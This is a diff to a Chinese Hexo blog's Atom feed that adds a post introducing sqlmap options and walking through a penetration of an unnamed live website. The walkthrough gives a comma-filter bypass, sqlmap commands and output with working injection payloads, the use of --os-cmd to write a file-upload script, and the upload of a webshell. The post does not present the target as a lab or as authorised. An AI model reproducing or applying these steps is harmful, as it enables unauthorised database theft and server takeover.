@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-03-03T09:55:38.988Z</updated>
+  <updated>2019-03-10T15:57:04.577Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqlmap与一次渗透实战</title>
+    <link href="http://yoursite.com/2019/03/10/sqlmap%E4%B8%8E%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
+    <id>http://yoursite.com/2019/03/10/sqlmap与一次渗透实战/</id>
+    <published>2019-03-10T15:22:37.000Z</published>
+    <updated>2019-03-10T15:57:04.577Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h2><p>sqlmap是一个渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它有功能强大的检测引擎,针对各种数据库的渗透测试的功能选项，能够获取数据库中存储的数据，访问操作系统文件,执行操作系统命令等。<br>以下是简单的参数介绍:</p><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><table><thead><tr><th>命令</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td>- -date=DATE</td><td style="text-align:center">#通过post发送数据:  </td></tr><tr><td>- -cookie=COOKIE</td><td style="text-align:center">#cookie头的值  </td></tr><tr><td>- -user-agent=AGENT</td><td style="text-align:center">#指定http user-agent头  </td></tr><tr><td>- -random-agent</td><td style="text-align:center">#使用随机user-agent头  </td></tr><tr><td>- -tor</td><td style="text-align:center">#使用匿名网络</td></tr><tr><td>- -proxy=IP</td><td style="text-align:center">#设置代理</td></tr><tr><td>- -timeout</td><td style="text-align:center">#超时等待时间</td></tr></tbody></table><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><table><thead><tr><th>命令</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td>-a</td><td style="text-align:center">#检查一切  </td></tr><tr><td>- -users</td><td style="text-align:center">#数据库用户账户  </td></tr><tr><td>- -password</td><td style="text-align:center">#数据库账户密码  </td></tr><tr><td>- -is-dba</td><td style="text-align:center">#是否为root用户  </td></tr><tr><td>- -dbs</td><td style="text-align:center">#枚举数据库  </td></tr><tr><td>- -tables</td><td style="text-align:center">#枚举数据表  </td></tr><tr><td>- -columns</td><td style="text-align:center">#枚举字段  </td></tr><tr><td>- -count</td><td style="text-align:center">#检索表的条目数  </td></tr><tr><td>- -dump</td><td style="text-align:center">#转储数据库的表项  </td></tr><tr><td>- -dump-all</td><td style="text-align:center">#转储所有  </td></tr></tbody></table><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><table><thead><tr><th>命令</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td>- -os-cmd=CMD</td><td style="text-align:center">#执行cmd命令  </td></tr><tr><td>- -os-shell</td><td style="text-align:center">#建立shell  </td></tr><tr><td>- -os-pwn</td><td style="text-align:center">#获取OOB shell,meterpreter,vnc  ,例:sqlmap -u xxx –os-pwn msf-path /usr/share/metasploit-framework/  </td></tr><tr><td>- -os-bof</td><td style="text-align:center">#存储过程缓冲区溢出  </td></tr><tr><td>- -priv-esc</td><td style="text-align:center">#数据库进程用户权限提升  </td></tr><tr><td>- -reg-read</td><td style="text-align:center">#读取注册表项  </td></tr><tr><td>- -reg-add</td><td style="text-align:center">#添加注册表项  </td></tr><tr><td>- -reg-del</td><td style="text-align:center">#删除注册表项  </td></tr></tbody></table><p>注:使用–os 命令会向目标写入一个文件上传脚本,然后通过该上传脚本上传shell、meterpreter等,并修改权限(phpversion&lt;4.1.0时).</p><h2 id="一次渗透"><a href="#一次渗透" class="headerlink" title="一次渗透"></a>一次渗透</h2><p>对某网站进行渗透</p><h3 id="前期信息搜集"><a href="#前期信息搜集" class="headerlink" title="前期信息搜集"></a>前期信息搜集</h3><p>搜索该域名及IP,未发现有用信息.<br>使用御剑对网站目录进行扫描,未发现敏感信息:<br><img src="/2019/03/10/sqlmap与一次渗透实战/1.png" alt=""><br>在网站上也未找到后台和robots.txt.  </p><h3 id="发现sql注入"><a href="#发现sql注入" class="headerlink" title="发现sql注入"></a>发现sql注入</h3><p>但是在一个查询页面发现了sql注入漏洞:<br><img src="/2019/03/10/sqlmap与一次渗透实战/2.png" alt=""><br>对这个点进行测试发现过滤了逗号,可以通过union select * from ((select 1)a JOIN (select 2)b JOIN (select 3)c)的方式绕过,尝试使用”into outfile”写文件却未成功,于是用sqlmap进行渗透.<br>输入命令:sqlmap.py -u “<a href="http://www.xxxx.com/cj.php?code=1&quot;" target="_blank" rel="noopener">http://www.xxxx.com/cj.php?code=1&quot;</a> ,获得以下信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[15:38:05] [INFO] resuming back-end DBMS &apos;mysql&apos;</span><br><span class="line">[15:38:05] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: code (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)</span><br><span class="line">    Payload: code=1&apos; OR NOT 9500=9500#</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span><br><span class="line">    Payload: code=1&apos; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171716271,(SELECT (ELT(6682=6682,1))),0x716a6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- MBii</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: code=1&apos; OR SLEEP(5)-- KVCY</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - 13 columns</span><br><span class="line">    Payload: code=1&apos; UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x53415242557265476b6b777379697a4173616e47734c4c4b555a45534a6e614e476178754e634253,0x716a6a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#</span><br><span class="line">---</span><br><span class="line">[15:38:05] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003 or XP</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.4.33</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.5</span><br></pre></td></tr></table></figure></p><p>可知该sql注入漏洞可以利用,并且获得了系统信息、数据库信息等等.</p><h3 id="利用sql注入"><a href="#利用sql注入" class="headerlink" title="利用sql注入"></a>利用sql注入</h3><p>由于不知道网站后台,即使通过sql注入漏洞获取账号密码也不能完成任务,不过我们可以利用该漏洞在目标服务器上写一个文件上传脚本,然后上传webshell.<br>输入命令:sqlmap.py -u “<a href="http://www.xxx.com/cj.php?code=1&quot;" target="_blank" rel="noopener">http://www.xxx.com/cj.php?code=1&quot;</a> - -os-cmd=ipconfig, 然后配置参数,因为不清楚路径,所以选择Y,让sqlmap自动获取路径:<br><img src="/2019/03/10/sqlmap与一次渗透实战/3.png" alt=""><br>执行后可以看到sqlmap获取了路径,并且写入了两个脚本,其中第一个就是文件上传脚本,第二个是执行cmd命令的脚本,但是执行失败了,不过我们写入文件上传脚本的目的达成了.<br><img src="/2019/03/10/sqlmap与一次渗透实战/4.png" alt=""></p><h3 id="上传webshell完成渗透"><a href="#上传webshell完成渗透" class="headerlink" title="上传webshell完成渗透"></a>上传webshell完成渗透</h3><p>利用前面sqlmap写入的文件上传脚本tmpuugsd.php向目标上传大马<br><img src="/2019/03/10/sqlmap与一次渗透实战/5.png" alt=""><br>最后利用webshell成功完成渗透任务.  </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次渗透关键一步是利用sqlmap写入一个文件上传脚本,如果不清楚- -os 命令的原理可能不能快速完成任务,因此在平时的学习中要注意了解各类工具的原理.另外在获取webshell后才发现网站后台是admin+名称!!!说明信息搜集不够完美,思路不够开拓,今后需要注意完善.</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;sqlmap简介&quot;&gt;&lt;a href=&quot;#sqlmap简介&quot; class=&quot;headerlink&quot; title=&quot;sqlmap简介&quot;&gt;&lt;/a&gt;sqlmap简介&lt;/h2&gt;&lt;p&gt;sqlmap是一个渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>WordPress 5.0.0远程代码执行漏洞分析</title>
@@ -139,9 +164,9 @@
       <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
-    
       <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
     
       <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     
